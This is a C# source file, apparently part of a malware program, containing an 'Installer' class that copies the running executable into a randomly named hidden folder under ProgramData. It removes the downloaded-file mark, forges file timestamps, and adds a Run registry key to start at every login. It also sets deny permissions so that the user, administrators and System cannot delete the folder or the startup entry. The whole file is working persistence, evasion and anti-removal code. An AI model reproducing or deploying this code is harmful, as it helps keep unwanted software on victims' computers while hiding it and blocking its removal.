using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Reflection;
using Microsoft.Win32;
using System.Diagnostics;
using System.ComponentModel;

namespace A
{
    unsafe public class Installer
    {
        private static string[] FileNames = { "Solution", "Project", "Wireless", "Certificate", "Host",
                                              "Driver", "Process", "Build", "Windows", "Interface",
                                              "Diagnostic", "Release", "Debug", "Platform" };

        private static string CurrentUser = WindowsIdentity.GetCurrent().Name;
        private static Random Rand = new Random(Guid.NewGuid().GetHashCode());

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool DeleteFile(string lpFileName);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int memcmp(byte[] b1, byte[] b2, long count);

        public static void InstallFile()
        {
            string InstallRoot = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

            // remove any misc. previous installations
            foreach (string _previousInstall in Directory.GetDirectories(InstallRoot))
            {

                // if we are already installed -> reintall run once key but nothing else
                if (Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) == _previousInstall)
                {
                    string[] _childrenFiles = Directory.GetFiles(_previousInstall);
                    if (_childrenFiles.Length > 0)
                        CreateRegistryEntry(_childrenFiles[0]);
                    return;
                }

                // search for any previous installations and remove them
                if (_previousInstall.Contains("Config Cache"))
                {
                    bool marker1 = false;
                    bool marker2 = false;

                    foreach (string _fileName in FileNames)
                    {
                        if (_previousInstall.Contains(_fileName))
                        {
                            if (marker1)
                                marker2 = true;
                            else
                                marker1 = true;
                        }
                    }

                    // ensure that it is a directory made by us &&
                    // then read the file's content to see if it == to our current (if so, then delete)
                    if (marker1 && marker2)
                    {
                        // read self into byte array to compare
                        byte[] bufferSelfHdrs = ReadPEHeaders(Assembly.GetEntryAssembly().Location);

                        foreach (string _fileName in Directory.GetFiles(_previousInstall))
                        {
                            byte[] bufferChildHdrs = ReadPEHeaders(_fileName);

                            if (bufferSelfHdrs.Length == bufferChildHdrs.Length && memcmp(bufferSelfHdrs, bufferChildHdrs, bufferSelfHdrs.Length) == 0)
                            {
                                // if we have found a bad installation of ourself, we can delete it
                                DeleteDirectory(_previousInstall);
                                DeleteStartupEntry(_previousInstall);
                            }
                        }
                    }
                }
            }

            // Directory
            string InstallDirectoryName = string.Format("{0} {1} Config Cache {2}", FileNames[Rand.Next(0, FileNames.Length)], FileNames[Rand.Next(0, FileNames.Length)], Rand.Next(0, 100000));
            string InstallDirectoryPath = string.Concat(InstallRoot, "\\", InstallDirectoryName);

            // File
            string InstallFileName = string.Format("{0} {1}.exe", FileNames[Rand.Next(0, FileNames.Length)], FileNames[Rand.Next(0, FileNames.Length)]);
            string InstallFilePath = string.Concat(InstallDirectoryPath, "\\", InstallFileName);

            // Init
            CreateDirectory(InstallDirectoryPath);
            CopyFileToDirectory(InstallDirectoryPath, InstallFilePath);
            CreateRegistryEntry(InstallFilePath);
        }

        private static byte[] ReadPEHeaders(string FilePath)
        {
            byte[] bufferSelfHdrs = null;

            using (FileStream fs = new FileStream(FilePath, FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                using (BinaryReader rdr = new BinaryReader(fs))
                {
                    rdr.ReadBytes(0x3c);
                    int e_lfanew = rdr.ReadInt32();
                    rdr.BaseStream.Position = 0;
                    rdr.ReadBytes(e_lfanew);
                    rdr.ReadBytes(0x54);
                    int sizeOfHeaders = rdr.ReadInt32();
                    rdr.BaseStream.Position = 0;
                    bufferSelfHdrs = rdr.ReadBytes(sizeOfHeaders);
                }
            }

            return bufferSelfHdrs;
        }

        private static void CreateRegistryEntry(string InstallFilePath)
        {
            // unique registry key name is the directory name of the install file
            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

            regKey.SetValue(Path.GetFileName(Path.GetDirectoryName(InstallFilePath)), string.Format("\"{0}\"", InstallFilePath));
            regKey.Close();

            ProtectStartupEntry();
        }

        private static void DeleteStartupEntry(string InstallDirectoryPath)
        {
            UnProtectStartupEntry();

            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

            regKey.DeleteValue(Path.GetFileName(InstallDirectoryPath), true);
            regKey.Close();
        }

        private static void ProtectStartupEntry()
        {
            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

            RegistrySecurity regSec = regKey.GetAccessControl();

            RegistryAccessRule regAccessUser = new RegistryAccessRule(CurrentUser,
                                                          RegistryRights.Delete | RegistryRights.SetValue,
                                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                        PropagationFlags.None,
                                                        AccessControlType.Deny);

            RegistryAccessRule regAccessAdmin = new RegistryAccessRule("Administrators",
                                                      RegistryRights.Delete | RegistryRights.SetValue,
                                                       InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                       PropagationFlags.None,
                                                       AccessControlType.Deny);

            RegistryAccessRule regAccessSystem = new RegistryAccessRule("System",
                                                       RegistryRights.Delete | RegistryRights.SetValue,
                                                     InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                     PropagationFlags.None,
                                                     AccessControlType.Deny);

            regSec.AddAccessRule(regAccessUser);
            regSec.AddAccessRule(regAccessAdmin);
            regSec.AddAccessRule(regAccessSystem);

            regKey.SetAccessControl(regSec);
        }

        private static void UnProtectStartupEntry()
        {
            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions);

            RegistrySecurity regSec = regKey.GetAccessControl();

            RegistryAccessRule regAccessUser = new RegistryAccessRule(CurrentUser,
                                                        RegistryRights.Delete | RegistryRights.SetValue,
                                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                        PropagationFlags.None,
                                                        AccessControlType.Deny);

            RegistryAccessRule regAccessAdmin = new RegistryAccessRule("Administrators",
                                                       RegistryRights.Delete | RegistryRights.SetValue,
                                                       InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                       PropagationFlags.None,
                                                       AccessControlType.Deny);

            RegistryAccessRule regAccessSystem = new RegistryAccessRule("System",
                                                     RegistryRights.Delete | RegistryRights.SetValue,
                                                     InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                     PropagationFlags.None,
                                                     AccessControlType.Deny);

            regSec.RemoveAccessRule(regAccessUser);
            regSec.RemoveAccessRule(regAccessAdmin);
            regSec.RemoveAccessRule(regAccessSystem);

            regKey.SetAccessControl(regSec);
        }

        private static void CopyFileToDirectory(string DirectoryPath, string InstallPath)
        {
            UnProtectDirectory(DirectoryPath);

            File.Copy(Assembly.GetEntryAssembly().Location, InstallPath);

            DeleteFile(string.Concat(InstallPath, ":Zone.Identifier"));

            FileInfo fInfo = new FileInfo(InstallPath);

            fInfo.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed;

            DateTime spoofDate = new DateTime(Rand.Next(2007, 2013), Rand.Next(1, 12), Rand.Next(1, 25), Rand.Next(0, 23), Rand.Next(0, 59), Rand.Next(0, 59));
            fInfo.CreationTime = spoofDate;
            fInfo.LastAccessTime = spoofDate;
            fInfo.LastWriteTime = spoofDate;

            ProtectDirectory(DirectoryPath);
        }

        private static void CreateDirectory(string DirectoryPath)
        {
            if (Directory.Exists(DirectoryPath))
                DeleteDirectory(DirectoryPath);

            DirectoryInfo dirInfo = Directory.CreateDirectory(DirectoryPath);

            dirInfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed;

            DateTime spoofDate = new DateTime(Rand.Next(2007, 2013), Rand.Next(1, 12), Rand.Next(1, 25), Rand.Next(0, 23), Rand.Next(0, 59), Rand.Next(0, 59));
            dirInfo.CreationTime = spoofDate;
            dirInfo.LastAccessTime = spoofDate;
            dirInfo.LastWriteTime = spoofDate;

            ProtectDirectory(DirectoryPath);
        }

        private enum DeletionStatus : int
        {
            UnknownError = -1,
            DoesNotExist = 0,
            Success = 1,
            ActiveProcess = 2
        }

        private static DeletionStatus DeleteDirectory(string DirectoryPath)
        {
            if (!Directory.Exists(DirectoryPath))
                return DeletionStatus.DoesNotExist;

            UnProtectDirectory(DirectoryPath);

            foreach (string _childExe in Directory.GetFiles(DirectoryPath))
            {
                foreach (Process _childProcess in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(_childExe)))
                {
                    try
                    {
                        _childProcess.Kill();
                    }
                    catch (Win32Exception)
                    {
                        return DeletionStatus.ActiveProcess;
                    }
                    catch (Exception)
                    {
                        return DeletionStatus.UnknownError;
                    }
                }
            }

            Directory.Delete(DirectoryPath, true);

            if (!Directory.Exists(DirectoryPath))
                return DeletionStatus.Success;
            else
                return DeletionStatus.UnknownError;
        }

        private static void ProtectDirectory(string DirectoryPath)
        {
            DirectoryInfo dirInfo = new DirectoryInfo(DirectoryPath);

            DirectorySecurity dirSec = dirInfo.GetAccessControl();

            dirSec.AddAccessRule(new FileSystemAccessRule(CurrentUser,
                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            dirSec.AddAccessRule(new FileSystemAccessRule("Administrators",
                                           FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            dirSec.AddAccessRule(new FileSystemAccessRule("System",
                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            Directory.SetAccessControl(DirectoryPath, dirSec);
        }

        private static void UnProtectDirectory(string DirectoryPath)
        {
            DirectoryInfo dirInfo = new DirectoryInfo(DirectoryPath);

            DirectorySecurity dirSec = dirInfo.GetAccessControl();

            dirSec.RemoveAccessRule(new FileSystemAccessRule(CurrentUser,
                                       FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            dirSec.RemoveAccessRule(new FileSystemAccessRule("Administrators",
                                FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            dirSec.RemoveAccessRule(new FileSystemAccessRule("System",
                                       FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            Directory.SetAccessControl(DirectoryPath, dirSec);
        }
    }
}
